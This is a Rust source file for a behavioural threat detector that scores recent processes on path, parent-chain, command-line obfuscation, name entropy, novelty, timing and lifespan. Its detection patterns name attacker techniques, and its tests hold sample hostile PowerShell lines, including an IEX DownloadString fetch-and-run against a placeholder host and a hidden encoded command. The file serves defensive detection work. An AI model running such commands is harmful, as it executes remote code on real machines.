// ── F8 — Mini-EDR Behavioral Threat Detector ─────────────────────────────
//
// Purpose: classify processes recently observed in `process_lineage` by how
// "suspicious" they look. Lucy uses this to alert on emerging issues
// without depending on commercial EDR (CrowdStrike etc.) or AV signatures.
//
// This is NOT a malware scanner. It's a behavioral classifier with
// explainable heuristics. Three goals:
//
//   1. Surface processes worth a human glance (high false-positive cost
//      is fine — the user can see "why").
//   2. Provide reasoning, not just a score. Black-box risk scores feel
//      untrustworthy; this stays auditable.
//   3. Self-improve over time as a baseline accumulates (more days of
//      lineage data → better novelty signal).
//
// Heuristic axes (each contributes a normalized 0-1 sub-score):
//
//   • PATH_ODDNESS (0.20): runs from Temp, Downloads, AppData (non-MS)
//   • PARENT_ODDNESS (0.25): orphan, weird parent chain (e.g. wmiprvse
//     spawning powershell — common C2 pattern)
//   • CMDLINE_OBFUSCATION (0.20): base64, very long, hex blobs, -enc flag
//   • NAME_ENTROPY (0.10): random-looking binary name (a1b2c3d4.exe)
//   • NOVELTY (0.10): never seen before in baseline (>= 7 days lineage)
//   • TIMING (0.10): started outside typical user-activity hours
//   • SHORT_LIVED (0.05): vanished within seconds (could be legit, could
//     be reconnaissance)
//
// Threshold guidance:
//   • score < 0.30 → likely benign
//   • 0.30-0.55  → review when convenient
//   • 0.55-0.75  → review now
//   • >= 0.75    → alert (Lucy proactively surfaces)

use crate::commands::metrics::shared_db;
use crate::commands::process_lineage::ProcessLineageRow;
use chrono::{Local, Timelike};
use rusqlite::params;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatCandidate {
    pub pid: u32,
    pub name: String,
    pub exe_path: String,
    pub cmdline_preview: String,
    pub parent_chain: String,
    pub first_seen: i64,
    pub vanished_at: Option<i64>,
    pub score: f64,
    pub band: String,   // "benign" | "review" | "alert"
    pub reasons: Vec<String>,
    pub sub_scores: SubScores,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SubScores {
    pub path_oddness: f64,
    pub parent_oddness: f64,
    pub cmdline_obfuscation: f64,
    pub name_entropy: f64,
    pub novelty: f64,
    pub timing: f64,
    pub short_lived: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatScanResult {
    pub total_scanned: usize,
    pub alerts: usize,
    pub reviews: usize,
    pub benign: usize,
    pub candidates: Vec<ThreatCandidate>,
    pub baseline_days: i64,
}

fn now_ts() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

// ── Heuristic 1: PATH_ODDNESS ─────────────────────────────────────────────
fn score_path_oddness(exe: &str) -> (f64, Option<String>) {
    let lower = exe.to_lowercase();
    if lower.is_empty() {
        return (0.6, Some("no exe path available".to_string()));
    }
    if lower.contains("\\temp\\") || lower.contains("/tmp/")
        || lower.contains("appdata\\local\\temp") {
        return (1.0, Some("runs from a temp directory".to_string()));
    }
    if lower.contains("\\downloads\\") {
        return (0.85, Some("runs from Downloads folder".to_string()));
    }
    if lower.contains("\\appdata\\")
        && !(lower.contains("microsoft") || lower.contains("google")
             || lower.contains("mozilla") || lower.contains("discord")
             || lower.contains("slack") || lower.contains("spotify")) {
        return (0.55, Some("runs from AppData (uncommon publisher)".to_string()));
    }
    if lower.contains("\\$recycle.bin\\") {
        return (1.0, Some("runs from the Recycle Bin (highly unusual)".to_string()));
    }
    if lower.contains("\\program files") || lower.contains("\\windows\\system32")
        || lower.contains("\\windows\\syswow64") {
        return (0.0, None); // expected
    }
    (0.20, None)
}

// ── Heuristic 2: PARENT_ODDNESS ───────────────────────────────────────────
// Patterns common in offensive tooling (PowerEmpire, Cobalt Strike, etc.):
//   wmiprvse.exe → powershell.exe / cmd.exe
//   svchost.exe → unknown user binary
//   spoolsv.exe → anything not a printer driver
//   ANY office app → powershell.exe (macro execution)
fn score_parent_oddness(parent_chain_json: &str, exe_name: &str) -> (f64, Option<String>) {
    let parsed: serde_json::Value = match serde_json::from_str(parent_chain_json) {
        Ok(v) => v,
        Err(_) => return (0.0, None),
    };
    let arr = match parsed.as_array() {
        Some(a) => a,
        None => return (0.0, None),
    };
    if arr.len() < 2 {
        // Orphan or self only — mildly suspicious
        return (0.4, Some("orphan / no parent recorded".to_string()));
    }

    let exe_lower = exe_name.to_lowercase();
    // Parent is index 1 (index 0 is the process itself)
    let parent_name = arr.get(1)
        .and_then(|n| n.get("name"))
        .and_then(|n| n.as_str())
        .unwrap_or("")
        .to_lowercase();

    // Known dangerous parent → child patterns
    let suspicious_pairs: &[(&str, &str, &str)] = &[
        ("wmiprvse.exe", "powershell", "WMI spawning PowerShell — classic lateral movement"),
        ("wmiprvse.exe", "cmd",        "WMI spawning cmd — classic lateral movement"),
        ("winword.exe", "powershell",  "Word spawning PowerShell — macro execution"),
        ("excel.exe",   "powershell",  "Excel spawning PowerShell — macro execution"),
        ("outlook.exe", "powershell",  "Outlook spawning PowerShell — phishing payload"),
        ("powerpnt.exe","powershell",  "PowerPoint spawning PowerShell — macro execution"),
        ("mshta.exe",   "powershell",  "mshta spawning PowerShell — HTA dropper"),
        ("regsvr32.exe","powershell",  "regsvr32 spawning PowerShell — squiblydoo bypass"),
        ("rundll32.exe","powershell",  "rundll32 spawning PowerShell — DLL hijack"),
        ("powershell.exe","powershell","PowerShell launching PowerShell — possible obfuscation chain"),
    ];
    for (parent_pat, child_pat, desc) in suspicious_pairs {
        if parent_name.contains(parent_pat) && exe_lower.contains(child_pat) {
            return (1.0, Some((*desc).to_string()));
        }
    }

    // spoolsv → anything but a printer-related binary
    if parent_name.contains("spoolsv") && !exe_lower.contains("print") && !exe_lower.contains("spool") {
        return (0.85, Some(format!("spoolsv.exe spawning {} (unusual)", exe_name)));
    }

    (0.0, None)
}

// ── Heuristic 3: CMDLINE_OBFUSCATION ──────────────────────────────────────
fn score_cmdline_obfuscation(cmdline: &str) -> (f64, Option<String>) {
    let lower = cmdline.to_lowercase();
    if lower.is_empty() { return (0.0, None); }

    // PowerShell encoded command flag
    if lower.contains(" -enc ") || lower.contains(" -encodedcommand")
        || lower.contains(" -e ") {
        return (1.0, Some("PowerShell -EncodedCommand (base64 payload)".to_string()));
    }
    if lower.contains(" -noprofile") && lower.contains(" -windowstyle hidden") {
        return (0.95, Some("PowerShell hidden+noprofile (stealth pattern)".to_string()));
    }
    if lower.contains("downloadstring(") || lower.contains("invoke-expression")
        || lower.contains("iex(") || lower.contains(" iex ") {
        return (0.95, Some("PowerShell download+exec (drive-by pattern)".to_string()));
    }

    // Long cmdline with high alpha ratio (base64-like blob)
    let len = cmdline.len();
    if len > 600 {
        let alpha_num = cmdline.chars().filter(|c| c.is_ascii_alphanumeric()).count();
        let ratio = alpha_num as f64 / len as f64;
        if ratio > 0.85 {
            return (0.80, Some(format!("very long cmdline ({} chars) with base64-like density", len)));
        }
        return (0.45, Some(format!("unusually long cmdline ({} chars)", len)));
    }
    (0.0, None)
}

// ── Heuristic 4: NAME_ENTROPY ─────────────────────────────────────────────
// A binary called "a1b2c3d4.exe" or "kdjfhsdfkj.exe" is more suspicious
// than "explorer.exe" or "Discord Updater.exe".
fn score_name_entropy(exe_path: &str) -> (f64, Option<String>) {
    let name = std::path::Path::new(exe_path)
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or("");
    if name.is_empty() || name.len() < 4 { return (0.0, None); }

    let lower = name.to_lowercase();
    // Common legit binaries — short-circuit
    let known_safe = ["chrome", "firefox", "explorer", "svchost", "system",
                       "discord", "slack", "spotify", "msedge", "outlook",
                       "winword", "excel", "powerpnt", "code", "vscode",
                       "node", "python", "java", "git", "powershell", "cmd",
                       "conhost", "dwm", "runtimebroker", "searchhost"];
    for s in known_safe.iter() { if lower.contains(s) { return (0.0, None); } }

    // Shannon entropy approximation: count unique chars / total chars
    let unique = name.chars().collect::<std::collections::HashSet<_>>().len() as f64;
    let total  = name.chars().count() as f64;
    let density = unique / total.max(1.0);

    // High density (>0.75) + mostly alphanumeric → looks random
    let alnum = name.chars().filter(|c| c.is_ascii_alphanumeric()).count() as f64;
    let alnum_ratio = alnum / total.max(1.0);

    if density > 0.75 && alnum_ratio > 0.85 && total >= 6.0 {
        // Heuristic refinement — pure digit-letter alternation = sketchy
        let alternations = name.chars().zip(name.chars().skip(1))
            .filter(|(a, b)| a.is_ascii_alphabetic() != b.is_ascii_alphabetic())
            .count() as f64;
        let alt_ratio = alternations / (total - 1.0).max(1.0);
        if alt_ratio > 0.55 {
            return (0.85, Some(format!("binary name '{}' looks random (high entropy)", name)));
        }
        return (0.55, Some(format!("binary name '{}' has high character diversity", name)));
    }
    (0.0, None)
}

// ── Heuristic 5: NOVELTY ──────────────────────────────────────────────────
// Has this exe path been seen before in our lineage history?
fn score_novelty(exe_path: &str, baseline_count: i64) -> (f64, Option<String>) {
    if exe_path.is_empty() { return (0.0, None); }
    // baseline_count is the number of past observations of this binary
    if baseline_count == 0 {
        return (1.0, Some("never observed before in this machine's history".to_string()));
    }
    if baseline_count < 3 {
        return (0.6, Some(format!("rarely seen on this machine ({} prior observations)", baseline_count)));
    }
    if baseline_count < 10 {
        return (0.25, None);
    }
    (0.0, None)
}

// ── Heuristic 6: TIMING ───────────────────────────────────────────────────
fn score_timing(first_seen: i64) -> (f64, Option<String>) {
    use chrono::DateTime;
    let dt = DateTime::from_timestamp(first_seen, 0)
        .map(|t| t.with_timezone(&Local))
        .unwrap_or_else(Local::now);
    let hour = dt.hour();
    // 02:00-05:59 → very unusual for a user-machine
    if (2..6).contains(&hour) {
        return (0.85, Some(format!("started at {:02}:xx — unusual hour", hour)));
    }
    // 00:00-01:59 or 23:00 → mildly unusual
    if hour < 2 || hour == 23 {
        return (0.40, Some(format!("started at {:02}:xx — outside typical work hours", hour)));
    }
    (0.0, None)
}

// ── Heuristic 7: SHORT_LIVED ──────────────────────────────────────────────
fn score_short_lived(row: &ProcessLineageRow) -> (f64, Option<String>) {
    let vanished = match row.vanished_at { Some(v) => v, None => return (0.0, None) };
    let lifespan = vanished - row.first_seen;
    if lifespan <= 3 && row.observed_count <= 1 {
        return (0.7, Some(format!("vanished {}s after start (very short-lived)", lifespan)));
    }
    if lifespan <= 10 {
        return (0.3, None);
    }
    (0.0, None)
}

// ── Public command ────────────────────────────────────────────────────────
#[tauri::command]
pub async fn threat_scan(
    since_min: Option<i64>,
    min_score: Option<f64>,
    limit: Option<i64>,
) -> Result<ThreatScanResult, String> {
    let lookback_sec = since_min.unwrap_or(60).clamp(1, 60 * 24 * 14) * 60;
    let cutoff = now_ts() - lookback_sec;
    let threshold = min_score.unwrap_or(0.30).clamp(0.0, 1.0);
    let cap = limit.unwrap_or(40).clamp(1, 200);

    shared_db(move |conn| {
        // Pull recent lineage rows (sticking with `process_lineage_list` shape)
        let mut stmt = conn.prepare(
            "SELECT id, pid, ppid, parent_chain, exe_path, cmdline, first_seen,
                    vanished_at, observed_count, chain_hash
             FROM process_lineage
             WHERE first_seen >= ?1
             ORDER BY first_seen DESC
             LIMIT 500"
        ).map_err(|e| format!("prepare: {}", e))?;

        let rows: Vec<ProcessLineageRow> = stmt
            .query_map(params![cutoff], |row| {
                Ok(ProcessLineageRow {
                    id: row.get(0)?,
                    pid: row.get::<_, i64>(1)? as u32,
                    ppid: row.get::<_, Option<i64>>(2)?.map(|v| v as u32),
                    parent_chain: row.get(3)?,
                    exe_path: row.get(4)?,
                    cmdline: row.get(5)?,
                    first_seen: row.get(6)?,
                    vanished_at: row.get(7)?,
                    observed_count: row.get(8)?,
                    chain_hash: row.get(9)?,
                })
            })
            .map_err(|e| format!("query: {}", e))?
            .filter_map(|r| r.ok())
            .collect();
        drop(stmt);

        // Baseline window for NOVELTY — count prior observations of each exe
        let baseline_cutoff = now_ts() - 7 * 24 * 3600;
        let mut baseline_counter = conn.prepare(
            "SELECT COUNT(*) FROM process_lineage WHERE exe_path = ?1 AND first_seen < ?2"
        ).map_err(|e| format!("prepare baseline: {}", e))?;

        let total_scanned = rows.len();
        let mut candidates: Vec<ThreatCandidate> = Vec::with_capacity(total_scanned);

        for r in &rows {
            let name = std::path::Path::new(&r.exe_path)
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| format!("pid-{}", r.pid));

            // Baseline count for this binary
            let baseline_count: i64 = baseline_counter
                .query_row(params![&r.exe_path, baseline_cutoff], |row| row.get(0))
                .unwrap_or(0);

            let (s_path, r_path) = score_path_oddness(&r.exe_path);
            let (s_parent, r_parent) = score_parent_oddness(&r.parent_chain, &name);
            let (s_cmd, r_cmd) = score_cmdline_obfuscation(&r.cmdline);
            let (s_name, r_name) = score_name_entropy(&r.exe_path);
            let (s_nov, r_nov) = score_novelty(&r.exe_path, baseline_count);
            let (s_time, r_time) = score_timing(r.first_seen);
            let (s_short, r_short) = score_short_lived(r);

            // Composite (weights sum to 1.0)
            let score = 0.20 * s_path
                      + 0.25 * s_parent
                      + 0.20 * s_cmd
                      + 0.10 * s_name
                      + 0.10 * s_nov
                      + 0.10 * s_time
                      + 0.05 * s_short;

            if score < threshold { continue; }

            let band = if score >= 0.75 { "alert" }
                       else if score >= 0.55 { "review" }
                       else { "benign" };

            let mut reasons = Vec::new();
            for r in [r_path, r_parent, r_cmd, r_name, r_nov, r_time, r_short].into_iter().flatten() { reasons.push(r); }

            let cmdline_preview = if r.cmdline.len() > 200 {
                format!("{}…", crate::utils::safe_truncate(&r.cmdline, 200))
            } else {
                r.cmdline.clone()
            };

            let parent_chain: serde_json::Value = serde_json::from_str(&r.parent_chain)
                .unwrap_or(serde_json::Value::Array(vec![]));
            let parent_summary = parent_chain.as_array()
                .map(|arr| arr.iter()
                    .filter_map(|n| n.get("name").and_then(|v| v.as_str()))
                    .take(4)
                    .collect::<Vec<_>>()
                    .join(" ← "))
                .unwrap_or_default();

            candidates.push(ThreatCandidate {
                pid: r.pid,
                name,
                exe_path: r.exe_path.clone(),
                cmdline_preview,
                parent_chain: parent_summary,
                first_seen: r.first_seen,
                vanished_at: r.vanished_at,
                score,
                band: band.to_string(),
                reasons,
                sub_scores: SubScores {
                    path_oddness: s_path,
                    parent_oddness: s_parent,
                    cmdline_obfuscation: s_cmd,
                    name_entropy: s_name,
                    novelty: s_nov,
                    timing: s_time,
                    short_lived: s_short,
                },
            });
        }

        candidates.sort_by(|a, b| b.score.partial_cmp(&a.score).unwrap_or(std::cmp::Ordering::Equal));
        candidates.truncate(cap as usize);

        let alerts = candidates.iter().filter(|c| c.band == "alert").count();
        let reviews = candidates.iter().filter(|c| c.band == "review").count();
        let benign = candidates.iter().filter(|c| c.band == "benign").count();

        Ok(ThreatScanResult {
            total_scanned,
            alerts,
            reviews,
            benign,
            candidates,
            baseline_days: 7,
        })
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn temp_dir_paths_score_high() {
        let (s, r) = score_path_oddness("C:\\Users\\u\\AppData\\Local\\Temp\\xyz.exe");
        assert!(s >= 0.9);
        assert!(r.is_some());
    }

    #[test]
    fn known_good_paths_score_zero() {
        let (s, _) = score_path_oddness("C:\\Windows\\System32\\svchost.exe");
        assert_eq!(s, 0.0);
    }

    #[test]
    fn encoded_powershell_scores_max() {
        let (s, _) = score_cmdline_obfuscation("powershell.exe -nop -w hidden -enc JABjAGwA...");
        assert_eq!(s, 1.0);
    }

    #[test]
    fn iex_download_scores_high() {
        let (s, _) = score_cmdline_obfuscation("powershell IEX(New-Object Net.WebClient).DownloadString('http://x.y')");
        assert!(s >= 0.9);
    }

    #[test]
    fn random_binary_name_flagged() {
        let (s, _) = score_name_entropy("C:\\Temp\\a1b2c3d4e5.exe");
        assert!(s > 0.5);
    }

    #[test]
    fn known_safe_name_not_flagged() {
        let (s, _) = score_name_entropy("C:\\Program Files\\Discord\\Discord.exe");
        assert_eq!(s, 0.0);
    }

    #[test]
    fn novelty_first_time_max() {
        let (s, _) = score_novelty("C:\\foo.exe", 0);
        assert_eq!(s, 1.0);
    }

    #[test]
    fn novelty_well_known_zero() {
        let (s, _) = score_novelty("C:\\Windows\\System32\\svchost.exe", 100);
        assert_eq!(s, 0.0);
    }

    #[test]
    fn macro_pattern_flagged() {
        let chain = r#"[{"pid":1,"name":"powershell.exe","exe":""},{"pid":2,"name":"winword.exe","exe":""}]"#;
        let (s, _) = score_parent_oddness(chain, "powershell.exe");
        assert_eq!(s, 1.0, "Word→PowerShell must be max-flagged");
    }
}
